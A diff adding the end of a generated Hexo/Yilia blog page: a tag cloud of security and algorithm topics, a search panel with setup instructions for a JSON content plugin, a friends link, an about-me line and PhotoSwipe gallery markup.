+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">writeup</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">STL</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CVE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Win</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">ML</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">GPLT</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Metasploit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PAT</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">POJ</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">FILE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Qt</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">C/C++</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">动态规划</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">UVa</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">贪心</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">中途相遇法</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">滑动窗口</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">构造法</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">heap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">libheap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">stack</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ret2dlresolve</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">life</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">算法概述</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: false
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends" q-show="friends">
+  		
+        <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="http://www.reehy.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>Ree的墓碑</a>
+            </li>
+          
+        </ul>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">Send you a bullet.&lt;br&gt;&lt;br&gt;Face fear of life bravely.</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
